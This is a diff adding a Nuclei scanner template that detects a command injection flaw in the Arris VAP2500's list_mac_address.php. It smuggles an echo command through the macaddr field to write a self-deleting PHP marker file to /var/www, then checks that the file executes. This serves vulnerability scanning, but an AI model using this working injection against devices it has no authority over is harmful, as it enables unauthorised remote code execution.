@@ -1,0 +1,53 @@
+id: arris-vap2500-list-mac-address-rce
+info:
+  name: Arris VAP2500 Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template exploits a command execution vulnerability in the Arris VAP2500 device by crafting malicious input to the `list_mac_address.php` endpoint.
+
+variables:
+  t1: "{{rand_base(6)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: post-command-injection
+    method: POST
+    path:
+      - "{{BaseURL}}/list_mac_address.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+%40error_reporting%280%29%3Becho+%22{{t2}}%22%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+%2Fvar%2Fwww%2F{{t1}}.php&action=0&settype=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ARRIS"
+
+  - id: get-verify-command-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
